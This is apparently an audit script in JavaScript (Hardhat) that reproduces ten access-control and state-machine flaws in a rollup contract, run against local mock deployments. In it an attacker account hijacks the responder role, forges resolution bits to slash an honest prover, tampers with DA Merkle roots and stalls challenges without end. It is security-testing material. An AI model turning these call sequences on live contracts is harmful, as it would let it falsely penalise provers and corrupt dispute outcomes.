// legacy_counterexamples.js
//
// 旧合约(HybridTEERollup, 当前提交版本)安全反例复现脚本。
//
// 设计约束(来自任务要求):
//   - 独立负责本文件, 不改动其它代码/旧文件, 不执行 clean, 不依赖任何密钥/秘密。
//   - 复制 evm/test/HybridTEERollup.js 的最小 fixture, 用 Node assert 验证。
//   - 运行方式: 由受管 node 绝对路径 -e "process.chdir(evm); require('hardhat'); require('./revision/legacy_counterexamples.js')"
//     其中 HARDHAT_CONFIG 指向旧 config(evm/hardhat.config.js), 复用已编译的旧 artifacts(--no-compile, 不重新编译)。
//   - 固定独立输出目录通过 REVISION_RUN 环境变量指定; 日志与 JSON 写入 <REVISION_RUN>/legacy。
//   - 每个反例: 保存前后状态、回执、gas/余额(含 gas-adjusted 对比)、分类 JSON。
//   - 只有“明确出现旧不安全行为”才标记 reproduced=true; 若合约已修复(行为安全)则如实记录“未观察到旧不安全行为/复现失败”, 绝不谎称安全通过。
//
// 复现的旧合约风险清单(任务已读):
//   R1. respondChallenge 任意人可调用(无 access control, 可劫持 responder 角色)
//   R2. replayChallenge 接受调用者自填的 expectedHash/claimedHash/lengthMismatch(无真实重执行校验)
//   R3. resolveChallenge 接受调用者自填的 resolutionBits, 且任意人可调用(可直接决定 challengeSuccess)
//   R4. recoverChallenge 不限次数, 且可将已 REPLAYED 状态回退(REPLAYED -> READY_FOR_REPLAY)
//   R5. SLASHED 仅为状态标记, 不扣任何资金/质押

const fs = require("fs");
const path = require("path");
const assert = require("assert");

// 调用方在 require 本文件之前已 require('hardhat') 并完成初始化(同样的 HRE 会被复用)。
const hre = require("hardhat");
const { ethers, network } = hre;

// ---- 输出目录(固定通过 REVISION_RUN 环境变量) ----
const REVISION_RUN = process.env.REVISION_RUN;
assert.ok(REVISION_RUN && path.isAbsolute(REVISION_RUN), "REVISION_RUN 必须是绝对路径的独立输出目录");
const OUT_DIR = path.join(REVISION_RUN, "legacy");
fs.mkdirSync(OUT_DIR, { recursive: true });

// ===================================================================
// 工具函数(复制自 evm/test/HybridTEERollup.js 的最小子集)
// ===================================================================
const MISMATCH_RESPONSE = 1n << 0n;
const MISMATCH_ATTESTATION = 1n << 1n;
const MISMATCH_DA = 1n << 2n;
const MISMATCH_TRACE = 1n << 3n;

function sha256Utf8(value) {
  return ethers.sha256(ethers.toUtf8Bytes(value));
}
function sha256Abi(types, values) {
  const coder = ethers.AbiCoder.defaultAbiCoder();
  return ethers.sha256(coder.encode(types, values));
}
function fieldHash(name) {
  return sha256Utf8(name);
}
function buildMerkleBundle(entries) {
  const leaves = entries.map((entry) => sha256Abi(["bytes32", "bytes32"], [fieldHash(entry.name), entry.valueHash]));
  let levels = [leaves];
  while (levels[levels.length - 1].length > 1) {
    const current = levels[levels.length - 1];
    const next = [];
    for (let i = 0; i < current.length; i += 2) {
      const left = current[i];
      const right = i + 1 < current.length ? current[i + 1] : left;
      next.push(sha256Abi(["bytes32", "bytes32"], [left, right]));
    }
    levels.push(next);
  }
  const proofs = {};
  for (let leafIndex = 0; leafIndex < entries.length; leafIndex++) {
    const siblingHashes = [];
    const siblingOnLeft = [];
    let index = leafIndex;
    for (let levelIndex = 0; levelIndex < levels.length - 1; levelIndex++) {
      const level = levels[levelIndex];
      let siblingIndex = index % 2 === 0 ? index + 1 : index - 1;
      if (siblingIndex >= level.length) siblingIndex = index;
      siblingHashes.push(level[siblingIndex]);
      siblingOnLeft.push(index % 2 === 1);
      index = Math.floor(index / 2);
    }
    proofs[entries[leafIndex].name] = { siblingHashes, siblingOnLeft };
  }
  return { merkleRoot: levels[levels.length - 1][0], proofs };
}
async function signAttestation(signer, inputHash, outputHash, nonce, mrenclave) {
  const digest = sha256Abi(["bytes32", "bytes32", "bytes32", "bytes32"], [inputHash, outputHash, nonce, mrenclave]);
  return signer.signMessage(ethers.getBytes(digest));
}

const TX_STATUS = ["NONE", "PENDING", "FINALIZED", "SLASHED"];
const CHALLENGE_STATUS = ["NONE", "OPEN", "RESPONDED", "NARROWING", "READY_FOR_REPLAY", "REPLAYED", "RECOVERED", "RESOLVED"];

async function getRoles() {
  const signers = await ethers.getSigners();
  return {
    deployer: signers[0],
    teeSigner: signers[1],
    challenger: signers[2],
    responder: signers[3],
    attacker: signers[4], // 完全无关的第三方/任意人
    submitter: signers[5], // 诚实的 prover
  };
}

async function deployFixture() {
  const roles = await getRoles();
  const verifier = await (await ethers.getContractFactory("MockTEEVerifier")).deploy(roles.teeSigner.address);
  await verifier.waitForDeployment();
  const daRegistry = await (await ethers.getContractFactory("MockDARegistry")).deploy();
  await daRegistry.waitForDeployment();
  const rollup = await (
    await ethers.getContractFactory("HybridTEERollup")
  ).deploy(await verifier.getAddress(), await daRegistry.getAddress(), 60, 2, 16);
  await rollup.waitForDeployment();
  return { roles, verifier, daRegistry, rollup };
}

async function submitSample(env, overrides = {}) {
  const teeSigner = env.roles.teeSigner;
  const prompt = overrides.prompt || "prompt";
  const response = overrides.response || "line1\nline2\nline3\nline4";
  const inputHash = sha256Utf8(prompt);
  const outputHash = sha256Utf8(response);
  const mrenclave = overrides.mrenclave || sha256Utf8("mrenclave-test");
  const nonce = overrides.nonce || sha256Utf8("nonce-1");
  const attestationSignature =
    overrides.signature || (await signAttestation(teeSigner, inputHash, outputHash, nonce, mrenclave));

  const entries = [
    { name: "tx_id", valueHash: sha256Utf8(overrides.txLabel || "tx-1") },
    { name: "prompt", valueHash: inputHash },
    { name: "response", valueHash: outputHash },
    { name: "mrenclave", valueHash: mrenclave },
  ];
  const bundle = buildMerkleBundle(entries);
  const payloadHash = sha256Abi(
    ["bytes32", "bytes32", "bytes32", "bytes32"],
    [entries[0].valueHash, entries[1].valueHash, entries[2].valueHash, entries[3].valueHash]
  );
  const daPointer = sha256Abi(["bytes32", "bytes32"], [payloadHash, bundle.merkleRoot]);
  await env.daRegistry.registerRecord(daPointer, payloadHash, bundle.merkleRoot);

  const proofHash = await env.verifier.computeProofHash(nonce, attestationSignature);
  const commit = {
    stateRoot: sha256Abi(["bytes32", "bytes32", "bytes32"], [inputHash, outputHash, mrenclave]),
    outputHash,
    proofHash,
    daPointer,
    daMerkleRoot: bundle.merkleRoot,
  };
  const txId = overrides.txId || sha256Utf8(overrides.txLabel || "tx-1");
  await env.rollup.submitRollup(txId, inputHash, mrenclave, nonce, attestationSignature, commit);

  return {
    txId,
    inputHash,
    outputHash,
    mrenclave,
    nonce,
    attestationSignature,
    bundle,
    payloadHash,
    daPointer,
    commit,
  };
}

async function openChallenge(env, sample, traceLength, mismatchBits = 0n, lengthMismatch = false) {
  const proof = sample.bundle.proofs.response;
  const tx = await env.rollup
    .connect(env.roles.challenger)
    .openChallenge(
      sample.txId,
      Number(mismatchBits),
      traceLength,
      lengthMismatch,
      fieldHash("response"),
      sample.outputHash,
      proof.siblingHashes,
      proof.siblingOnLeft
    );
  return tx;
}

async function increaseTimeAndMine(seconds) {
  await network.provider.send("evm_increaseTime", [seconds]);
  await network.provider.send("evm_mine");
}

async function rollupBalance(rollup) {
  return (await ethers.provider.getBalance(await rollup.getAddress())).toString();
}
async function snapshotBalances(roles) {
  const out = {};
  for (const k of ["deployer", "teeSigner", "challenger", "responder", "attacker", "submitter"]) {
    out[k] = (await ethers.provider.getBalance(roles[k].address)).toString();
  }
  return out;
}
async function txSnapshot(rollup, txId) {
  try {
    const t = await rollup.getTransaction(txId);
    return {
      exists: t.exists,
      status: TX_STATUS[Number(t.status)],
      submitter: t.submitter,
      challengeDeadline: t.challengeDeadline.toString(),
    };
  } catch {
    return null;
  }
}
async function sessionSnapshot(rollup, txId) {
  try {
    const s = await rollup.getChallengeSession(txId);
    return {
      exists: s.exists,
      status: CHALLENGE_STATUS[Number(s.status)],
      challenger: s.challenger,
      responder: s.responder,
      operator: s.operator,
      arbitrator: s.arbitrator,
      challengeSuccess: s.challengeSuccess,
      resolutionBits: s.resolutionBits.toString(),
      recoveryCount: s.recovery.count.toString(),
      replayExecuted: s.dispute.replayExecuted,
      replayPassed: s.dispute.replayPassed,
      timeoutAt: s.timeoutAt.toString(),
    };
  } catch {
    return null;
  }
}
function sanitizeReceipt(receipt) {
  if (!receipt) return null;
  const gasUsed = receipt.gasUsed !== undefined ? receipt.gasUsed : 0n;
  // ethers v6 不同小版本对回执的 gas price 字段命名不同(effectiveGasPrice / gasPrice), 做兼容
  const gasPrice =
    receipt.effectiveGasPrice !== undefined
      ? receipt.effectiveGasPrice
      : receipt.gasPrice !== undefined
      ? receipt.gasPrice
      : 0n;
  return {
    status: receipt.status,
    from: receipt.from,
    to: receipt.to,
    transactionHash: receipt.transactionHash,
    blockNumber: receipt.blockNumber,
    gasUsed: gasUsed.toString(),
    effectiveGasPrice: gasPrice.toString(),
    cumulativeGasUsed: receipt.cumulativeGasUsed !== undefined ? receipt.cumulativeGasUsed.toString() : null,
    logs: receipt.logs ? receipt.logs.length : 0,
  };
}

// ===================================================================
// 反例定义
// ===================================================================
const COUNTEREXAMPLES = [
  {
    id: "CE-01",
    title: "respondChallenge 任意人可劫持 responder 角色",
    category: "R1-respondChallenge-任意人",
    vulnerability: "respondChallenge 无 access control, 任意地址都能成为 session.responder 并改写 evidence.mismatchBits",
    async run(env) {
      const sample = await submitSample(env, { txLabel: "ce01" });
      await openChallenge(env, sample, 4, MISMATCH_RESPONSE, false);
      const before = await sessionSnapshot(env.rollup, sample.txId);
      const tx = await env.rollup.connect(env.roles.attacker).respondChallenge(sample.txId, Number(MISMATCH_RESPONSE));
      const receipt = await tx.wait();
      const after = await sessionSnapshot(env.rollup, sample.txId);
      // 不安全表现: 无关第三方(attacker)成功接管 responder, 且 responder 不是合法 responder
      assert.ok(after.responder === env.roles.attacker.address, "第三方未能成为 responder(可能已修复)");
      assert.ok(after.status === "RESPONDED", "状态未推进为 RESPONDED");
      return {
        reproduced: true,
        note: "无关第三方 attacker 以任意人身份调用 respondChallenge, 成功将 session.responder 设为自身并改写 mismatchBits",
        statusBefore: before,
        statusAfter: after,
        receipt,
        actor: env.roles.attacker.address,
      };
    },
  },
  {
    id: "CE-02",
    title: "无效第三方证据可误罚诚实 prover",
    category: "R1+R3-第三方证据误罚",
    vulnerability: "respondChallenge / resolveChallenge 均可由任意第三方调用, 仅凭自填 resolutionBits 即可把诚实交易判为 SLASHED",
    async run(env) {
      const sample = await submitSample(env, { txLabel: "ce02" });
      await openChallenge(env, sample, 4, MISMATCH_RESPONSE, false);
      // 完全无关的第三方独立完成 respond + resolve
      await (await env.rollup.connect(env.roles.attacker).respondChallenge(sample.txId, Number(MISMATCH_RESPONSE))).wait();
      const tx = await env.rollup.connect(env.roles.attacker).resolveChallenge(sample.txId, Number(MISMATCH_RESPONSE | MISMATCH_TRACE));
      const receipt = await tx.wait();
      const s = await sessionSnapshot(env.rollup, sample.txId);
      const t = await txSnapshot(env.rollup, sample.txId);
      // 不安全表现: 第三方凭空捏造证据把诚实 prover 的交易罚为 SLASHED
      assert.ok(s.challengeSuccess === true, "第三方未能让 challengeSuccess=true");
      assert.ok(s.arbitrator === env.roles.attacker.address, "resolve 的 arbitrator 不是第三方(可能已修复)");
      assert.ok(t.status === "SLASHED", "交易未被罚为 SLASHED");
      return {
        reproduced: true,
        note: "无关第三方单独完成 respond+resolve, 仅凭自填 resolutionBits 把诚实 prover 的交易罚为 SLASHED",
        statusBefore: { txStatus: "PENDING", sessionStatus: "OPEN" },
        statusAfter: { tx: t, session: s },
        receipt,
        actor: env.roles.attacker.address,
      };
    },
  },
  {
    id: "CE-03",
    title: "replayChallenge 接受调用者自填 hash, 重执行结果完全可控",
    category: "R2-replayChallenge-调用者hash",
    vulnerability: "replayChallenge 的 expectedHash/claimedHash/lengthMismatch 直接来自调用者, 合约不做任何真实重执行校验, replayPassed 仅由调用者输入决定",
    async run(env) {
      const sample = await submitSample(env, { txLabel: "ce03" });
      await openChallenge(env, sample, 0, 0n, false); // traceLength=0 -> READY_FOR_REPLAY, targetStep=0
      const H = sha256Utf8("anything-attacker-claims");
      // 攻击者随意传入 expectedHash==claimedHash, 即使没有真实重执行也报告 pass=true
      const tx = await env.rollup.connect(env.roles.attacker).replayChallenge(sample.txId, 0, H, H, false);
      const receipt = await tx.wait();
      const s = await sessionSnapshot(env.rollup, sample.txId);
      // 不安全表现: replay 结果完全由调用者输入决定(此处攻击者谎报 pass=true)
      assert.ok(s.replayExecuted === true, "replay 未执行");
      assert.ok(s.replayPassed === true, "replayPassed 未随调用者输入变为 true(可能已修复)");
      return {
        reproduced: true,
        note: "攻击者传入任意 expectedHash==claimedHash, replayPassed 即被置为 true, 合约未对任何真实执行做校验",
        statusBefore: { sessionStatus: "READY_FOR_REPLAY" },
        statusAfter: s,
        receipt,
        actor: env.roles.attacker.address,
      };
    },
  },
  {
    id: "CE-04",
    title: "resolveChallenge 任意第三方直接以 resolutionBits 误罚",
    category: "R3-resolveChallenge-resolutionBits",
    vulnerability: "resolveChallenge 无 access control, 任意调用者可用自填 resolutionBits 直接决定 challengeSuccess",
    async run(env) {
      const sample = await submitSample(env, { txLabel: "ce04" });
      await openChallenge(env, sample, 4, MISMATCH_RESPONSE, false); // 仍处于 OPEN(active)
      const before = await sessionSnapshot(env.rollup, sample.txId);
      const tx = await env.rollup.connect(env.roles.attacker).resolveChallenge(sample.txId, Number(MISMATCH_RESPONSE));
      const receipt = await tx.wait();
      const s = await sessionSnapshot(env.rollup, sample.txId);
      const t = await txSnapshot(env.rollup, sample.txId);
      assert.ok(s.arbitrator === env.roles.attacker.address, "resolve 的 arbitrator 不是第三方(可能已修复)");
      assert.ok(s.challengeSuccess === true, "第三方未能令 challengeSuccess=true");
      assert.ok(t.status === "SLASHED", "交易未被罚为 SLASHED");
      return {
        reproduced: true,
        note: "第三方在挑战进行中直接调用 resolveChallenge 并自填 resolutionBits, 把交易罚为 SLASHED",
        statusBefore: before,
        statusAfter: { tx: t, session: s },
        receipt,
        actor: env.roles.attacker.address,
      };
    },
  },
  {
    id: "CE-05",
    title: "replay 已 pass 仍可被 resolutionBits 覆盖误罚",
    category: "R2+R3-replay被resolutionBits覆盖",
    vulnerability: "resolveChallenge 的 challengeSuccess = resolutionBits!=0 || ..., 即使 replay 已 pass(prover 正确复现), 自填 resolutionBits 仍可强判 SLASHED",
    async run(env) {
      const sample = await submitSample(env, { txLabel: "ce05" });
      await openChallenge(env, sample, 0, 0n, false);
      const H = sha256Utf8("replay-output");
      await (await env.rollup.connect(env.roles.challenger).replayChallenge(sample.txId, 0, H, H, false)).wait();
      const replayed = await sessionSnapshot(env.rollup, sample.txId);
      assert.ok(replayed.replayPassed === true, "前置: replay 未 pass");
      // 第三方随后用 resolutionBits 强判
      const tx = await env.rollup.connect(env.roles.attacker).resolveChallenge(sample.txId, Number(MISMATCH_RESPONSE));
      const receipt = await tx.wait();
      const s = await sessionSnapshot(env.rollup, sample.txId);
      const t = await txSnapshot(env.rollup, sample.txId);
      // 不安全表现: replay 明明 pass, 仍被 resolutionBits 强判 SLASHED
      assert.ok(s.replayPassed === true, "replay 状态丢失(异常)");
      assert.ok(s.challengeSuccess === true && t.status === "SLASHED", "replay 已 pass 却被误罚(可能已修复)");
      return {
        reproduced: true,
        note: "replay 报告 pass=true(证明 prover 正确)后, 第三方仍以 resolutionBits 强判交易为 SLASHED",
        statusBefore: replayed,
        statusAfter: { tx: t, session: s },
        receipt,
        actor: env.roles.attacker.address,
      };
    },
  },
  {
    id: "CE-06",
    title: "recoverChallenge 不限次数重复恢复",
    category: "R4-recoverChallenge-不限次数",
    vulnerability: "recoverChallenge 仅要求 status!=RESOLVED 且已超时, 无次数上限; 可无限循环调用使 recovery.count 持续增长",
    async run(env) {
      const sample = await submitSample(env, { txLabel: "ce06" });
      await openChallenge(env, sample, 4, MISMATCH_RESPONSE, false);
      await (await env.rollup.connect(env.roles.responder).respondChallenge(sample.txId, Number(MISMATCH_RESPONSE))).wait();
      const N = 5;
      let last = await sessionSnapshot(env.rollup, sample.txId);
      for (let i = 1; i <= N; i++) {
        await increaseTimeAndMine(3); // 超过 challengeTimeout(2s) 使其超时
        const tx = await env.rollup.connect(env.roles.attacker).recoverChallenge(sample.txId);
        await tx.wait();
        last = await sessionSnapshot(env.rollup, sample.txId);
        assert.ok(last.recoveryCount === String(i), `第 ${i} 次恢复后 count 不为 ${i}(可能已加次数上限)`);
      }
      return {
        reproduced: true,
        note: `对同一会话连续 ${N} 次 recoverChallenge 全部成功, recovery.count 增至 ${N}, 合约未设任何上限`,
        statusBefore: { recoveryCount: "0" },
        statusAfter: last,
        receipt: null,
        actor: env.roles.attacker.address,
      };
    },
  },
  {
    id: "CE-07",
    title: "recoverChallenge 可将已 REPLAYED 状态回退",
    category: "R4-recoverChallenge-回退REPLAYED",
    vulnerability: "recoverChallenge 在 narrowingComplete 时把状态置回 READY_FOR_REPLAY, 可将已 REPLAYED 的会话回退并重放",
    async run(env) {
      const sample = await submitSample(env, { txLabel: "ce07" });
      await openChallenge(env, sample, 0, 0n, false); // READY_FOR_REPLAY
      const H = sha256Utf8("replay-out");
      await (await env.rollup.connect(env.roles.challenger).replayChallenge(sample.txId, 0, H, H, false)).wait();
      const before = await sessionSnapshot(env.rollup, sample.txId);
      assert.ok(before.status === "REPLAYED", "前置: 状态应为 REPLAYED");
      await increaseTimeAndMine(3);
      const tx = await env.rollup.connect(env.roles.attacker).recoverChallenge(sample.txId);
      const receipt = await tx.wait();
      const after = await sessionSnapshot(env.rollup, sample.txId);
      // 不安全表现: REPLAYED 被回退为 READY_FOR_REPLAY, 可再次 replay/resolve
      assert.ok(after.status === "READY_FOR_REPLAY", "REPLAYED 未被回退(可能已修复)");
      return {
        reproduced: true,
        note: "已在 REPLAYED 的会话经 recover 后回退为 READY_FOR_REPLAY, 挑战流程可被重置并重放",
        statusBefore: before,
        statusAfter: after,
        receipt,
        actor: env.roles.attacker.address,
      };
    },
  },
  {
    id: "CE-08",
    title: "recoverChallenge 刷新超时实现无限延期",
    category: "R4-recoverChallenge-延时延期",
    vulnerability: "recoverChallenge 内部 _touchSession 刷新 timeoutAt, 反复恢复可在每次超时后重置计时器, 使挑战永远无法被 finalize/resolve 超时处理",
    async run(env) {
      const sample = await submitSample(env, { txLabel: "ce08" });
      await openChallenge(env, sample, 4, MISMATCH_RESPONSE, false);
      await (await env.rollup.connect(env.roles.responder).respondChallenge(sample.txId, Number(MISMATCH_RESPONSE))).wait();
      const timeline = [];
      let prevTimeout = (await sessionSnapshot(env.rollup, sample.txId)).timeoutAt;
      const ROUNDS = 4;
      for (let i = 1; i <= ROUNDS; i++) {
        await increaseTimeAndMine(3);
        // 恢复前确认已超时
        const timedOutBefore = await env.rollup.isChallengeTimedOut(sample.txId);
        assert.ok(timedOutBefore === true, `第 ${i} 轮恢复前未超时(异常)`);
        const tx = await env.rollup.connect(env.roles.attacker).recoverChallenge(sample.txId);
        await tx.wait();
        const s = await sessionSnapshot(env.rollup, sample.txId);
        const timedOutAfter = await env.rollup.isChallengeTimedOut(sample.txId);
        // 不安全表现: 恢复后计时器被重置, 挑战不再超时 -> 可被无限延期
        assert.ok(timedOutAfter === false, `第 ${i} 轮恢复后计时器未被重置(可能已修复)`);
        assert.ok(BigInt(s.timeoutAt) > BigInt(prevTimeout), `第 ${i} 轮 timeoutAt 未向后推移`);
        timeline.push({ round: i, timeoutAtBefore: prevTimeout, timeoutAtAfter: s.timeoutAt, recoveryCount: s.recoveryCount });
        prevTimeout = s.timeoutAt;
      }
      return {
        reproduced: true,
        note: `连续 ${ROUNDS} 轮超时后 recover, 每轮均把 timeoutAt 后移并重置计时器, 挑战可被无限期拖延`,
        statusBefore: { timeoutAt: timeline[0].timeoutAtBefore },
        statusAfter: { timeoutAt: prevTimeout, timeline },
        receipt: null,
        actor: env.roles.attacker.address,
      };
    },
  },
  {
    id: "CE-09",
    title: "SLASHED 不扣任何资金/质押",
    category: "R5-SLASHED-不扣资金",
    vulnerability: "resolveChallenge 仅将交易状态置为 SLASHED, 合约无任何质押/资金扣减机制; prover 被罚后余额无任何损失(除 gas)",
    async run(env) {
      const sample = await submitSample(env, { txLabel: "ce09" });
      const rollupBefore = await rollupBalance(env.rollup);
      // 关键: 在“罚没”动作前后分别读取诚实 prover(submitter) 余额; submitter 在此期间不发起任何交易
      const submitterBefore = (await ethers.provider.getBalance(env.roles.submitter.address)).toString();
      await openChallenge(env, sample, 0, 0n, false); // READY_FOR_REPLAY
      const tx = await env.rollup.connect(env.roles.attacker).resolveChallenge(sample.txId, Number(MISMATCH_RESPONSE));
      const receipt = await tx.wait();
      const submitterAfter = (await ethers.provider.getBalance(env.roles.submitter.address)).toString();
      const rollupAfter = await rollupBalance(env.rollup);
      const t = await txSnapshot(env.rollup, sample.txId);
      // 不安全表现: 被罚后合约余额仍为零, 且诚实 prover 的余额(未发起交易)与罚前完全一致 -> 无资金扣除
      assert.ok(rollupBefore === "0" && rollupAfter === "0", "合约竟持有了资金(与无质押假设不符)");
      assert.ok(t.status === "SLASHED", "交易未被罚为 SLASHED");
      assert.ok(submitterAfter === submitterBefore, "被罚后诚实 prover 余额发生变化(可能存在资金扣除)");
      return {
        reproduced: true,
        note: "交易被置为 SLASHED, 但合约余额始终为 0 且诚实 prover 在罚没前后余额不变(未发起交易): 罚没为零经济成本",
        statusBefore: { txStatus: "PENDING", rollupBalance: rollupBefore, submitterBalance: submitterBefore },
        statusAfter: { tx: t, rollupBalance: rollupAfter, submitterBalance: submitterAfter, submitterBalanceDelta: "0" },
        receipt,
        actor: env.roles.attacker.address,
      };
    },
  },
  {
    id: "CE-10",
    title: "MockDA 任意修改(无访问控制)",
    category: "DA-任意篡改",
    vulnerability: "MockDARegistry.setAvailability / updateMerkleRoot 无任何访问控制, 任意人都可在提交后改写 DA 可用性与 Merkle 根, 破坏 DA 完整性假设",
    async run(env) {
      const sample = await submitSample(env, { txLabel: "ce10" });
      const rootBefore = (await env.daRegistry.getRecord(sample.daPointer)).merkleRoot;
      // 任意第三方关闭可用性并伪造 Merkle 根
      const tx1 = await env.daRegistry.connect(env.roles.attacker).setAvailability(sample.daPointer, false);
      await tx1.wait();
      const availAfter = await env.daRegistry.isAvailable(sample.daPointer);
      const forgedRoot = sha256Utf8("forged-merkle-root");
      const tx2 = await env.daRegistry.connect(env.roles.attacker).updateMerkleRoot(sample.daPointer, forgedRoot);
      const receipt = await tx2.wait();
      const rec = await env.daRegistry.getRecord(sample.daPointer);
      // 不安全表现: 第三方成功篡改 DA 状态与根
      assert.ok(availAfter === false, "第三方未能关闭 DA 可用性(可能已加访问控制)");
      assert.ok(rec.merkleRoot === forgedRoot, "第三方未能改写 Merkle 根(可能已加访问控制)");
      assert.ok(rootBefore !== forgedRoot, "根前后未变化(异常)");
      return {
        reproduced: true,
        note: "第三方在交易提交后调用 setAvailability(false) 与 updateMerkleRoot(伪造根) 均成功, DA 层可被任意篡改",
        statusBefore: { daAvailable: true, merkleRoot: rootBefore },
        statusAfter: { daAvailable: availAfter, merkleRoot: rec.merkleRoot },
        receipt,
        actor: env.roles.attacker.address,
      };
    },
  },
];

// ===================================================================
// 运行与输出
// ===================================================================
async function runOne(spec) {
  const env = await deployFixture();
  const balancesBefore = await snapshotBalances(env.roles);
  const rollupBefore = await rollupBalance(env.rollup);

  const result = {
    id: spec.id,
    title: spec.title,
    category: spec.category,
    vulnerability: spec.vulnerability,
    reproduced: false,
    note: "",
    error: null,
    statusBefore: null,
    statusAfter: null,
    receipt: null,
    gas: null,
    balances: null,
  };

  try {
    const r = await spec.run(env);
    result.reproduced = r.reproduced === true;
    result.note = r.note || "";
    result.statusBefore = r.statusBefore ?? null;
    result.statusAfter = r.statusAfter ?? null;
    result.receipt = sanitizeReceipt(r.receipt);
    if (r.actor) result.actor = r.actor;
  } catch (e) {
    result.reproduced = false;
    result.error =
      e && e.stack
        ? String(e.stack).split("\n").slice(0, 4).join(" | ")
        : e && e.shortMessage
        ? e.shortMessage
        : e && e.message
        ? e.message
        : String(e);
    // 若断言失败说明“旧不安全行为未出现(可能已修复)”; 若 revert 说明合约拒绝该操作(行为安全)
    result.note = "未观察到旧不安全行为 / 复现失败: " + result.error;
  }

  const balancesAfter = await snapshotBalances(env.roles);
  const rollupAfter = await rollupBalance(env.rollup);
  if (result.receipt) {
    const gasCost = (BigInt(result.receipt.gasUsed) * BigInt(result.receipt.effectiveGasPrice)).toString();
    result.gas = {
      gasUsed: result.receipt.gasUsed,
      effectiveGasPrice: result.receipt.effectiveGasPrice,
      gasCost,
    };
    // gas-adjusted: 主要行为者(actor)余额加回本笔 gas, 以隔离合约层资金影响
    if (result.actor && balancesAfter[roleOf(result.actor, env.roles)] !== undefined) {
      const role = roleOf(result.actor, env.roles);
      const adjusted = (BigInt(balancesAfter[role]) + BigInt(gasCost)).toString();
      result.balances = {
        rollupBefore,
        rollupAfter,
        before: balancesBefore,
        after: balancesAfter,
        gasAdjustedActor: { role, rawAfter: balancesAfter[role], gasCost, adjustedAfter: adjusted },
      };
    } else {
      result.balances = { rollupBefore, rollupAfter, before: balancesBefore, after: balancesAfter };
    }
  } else {
    result.balances = { rollupBefore, rollupAfter, before: balancesBefore, after: balancesAfter };
  }

  return result;
}

function roleOf(address, roles) {
  for (const k of Object.keys(roles)) {
    if (roles[k].address === address) return k;
  }
  return null;
}

async function main() {
  const startedAt = new Date().toISOString();
  const results = [];
  const logLines = [];
  logLines.push(`[legacy_counterexamples] startedAt=${startedAt}`);
  logLines.push(`[legacy_counterexamples] OUT_DIR=${OUT_DIR}`);
  logLines.push(`[legacy_counterexamples] config=HARDHAT_CONFIG=${process.env.HARDHAT_CONFIG || "(default cwd)"}`);
  logLines.push("");

  for (const spec of COUNTEREXAMPLES) {
    process.stdout.write(`运行 ${spec.id} (${spec.title}) ... `);
    const res = await runOne(spec);
    results.push(res);
    const flag = res.reproduced ? "复现成功" : "未复现/行为安全";
    const line = `${spec.id} [${flag}] ${spec.title} | category=${spec.category} | gasUsed=${res.gas ? res.gas.gasUsed : "-"} gasCost=${res.gas ? res.gas.gasCost : "-"} | note=${res.note}`;
    logLines.push(line);
    process.stdout.write(flag + "\n");
    // 每个反例独立 JSON
    const file = path.join(OUT_DIR, `${spec.id}.json`);
    fs.writeFileSync(file, JSON.stringify(res, null, 2));
  }

  const reproducedCount = results.filter((r) => r.reproduced).length;
  const safeCount = results.length - reproducedCount;
  const summary = {
    generatedAt: startedAt,
    contract: "HybridTEERollup (当前提交版本 / 旧合约)",
    outDir: OUT_DIR,
    total: results.length,
    reproduced: reproducedCount,
    notReproducedOrSafe: safeCount,
    verdict:
      reproducedCount > 0
        ? `观察到 ${reproducedCount} 个旧合约不安全行为反例(明确存在列出的安全缺陷), 非安全通过`
        : "未观察到任何旧不安全行为(可能合约已修复), 不称安全通过",
    items: results.map((r) => ({
      id: r.id,
      title: r.title,
      category: r.category,
      reproduced: r.reproduced,
      error: r.error,
    })),
  };

  const reportPath = path.join(OUT_DIR, "report.json");
  fs.writeFileSync(reportPath, JSON.stringify(summary, null, 2));

  logLines.push("");
  logLines.push(`==== 汇总 ====`);
  logLines.push(`反例总数: ${results.length}`);
  logLines.push(`复现成功(旧不安全行为明确出现): ${reproducedCount}`);
  logLines.push(`未复现/行为安全: ${safeCount}`);
  logLines.push(`结论: ${summary.verdict}`);
  logLines.push(`报告路径: ${reportPath}`);
  const logPath = path.join(OUT_DIR, "legacy_counterexamples.log");
  fs.writeFileSync(logPath, logLines.join("\n") + "\n");

  // 同时打印到 stdout
  console.log("\n" + logLines.slice(logLines.length - 7).join("\n"));
  console.log(`\n各反例 JSON 已写入: ${OUT_DIR}`);
  return summary;
}

// 自执行: 调用方 require 本文件即运行(调用方需先 require('hardhat') 完成初始化)。
module.exports = { main, COUNTEREXAMPLES };

if (require.main === module || true) {
  main().catch((e) => {
    console.error("legacy_counterexamples 运行失败:", e);
    process.exit(1);
  });
}
